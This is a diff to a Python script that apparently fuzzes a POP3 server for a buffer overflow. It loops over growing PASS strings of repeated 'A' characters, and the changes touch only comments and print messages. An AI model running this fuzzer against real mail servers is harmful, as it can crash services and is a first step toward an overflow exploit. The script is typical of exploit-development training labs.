@@ -20,10 +20,9 @@ def main(argv):
     BUFFER_SIZE = 1024
 
     # Define Static username to pass into POP3 protocol USER prompt
-    #
     USER = "user"
 
-    # Check to see if the a name exists on the remote machine
+    # Loop over PASS input sizes 
     for i in range(1 ,MAX_PASS_BUFFER_LEN):
         # Try to connect to passed IP
         try:
@@ -37,7 +36,8 @@ def main(argv):
             return -1
 
         # Print for debug to console the length of password buffer
-        print("\n\nTesting Password Buffer Size i =" + str(i))
+        print("Connection to POP3 Server Successful! " +\
+            "Testing Password Buffer Size of" + str(i) + " bytes.")
 
         # Send server username
         s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
@@ -45,7 +45,7 @@ def main(argv):
         # Wait to receive a message
         data = s.recv(BUFFER_SIZE)
         data =  bytes.decode(data, 'UTF-8')
-        print("Received data: \n" + data)
+        print("Received data after USER input: \n" + data)
 
         # Send server password (with long string of A times i)
         s.send(bytes("PASS " + "A"*i + "\r\n", 'UTF-8'))
@@ -53,7 +53,7 @@ def main(argv):
         # Wait to receive a message
         data = s.recv(BUFFER_SIZE)
         data =  bytes.decode(data, 'UTF-8')
-        print("Received data: \n" + data)
+        print("Received data after PASS input: \n" + data)
         
         # Reset connection for next iteration
         s.close()
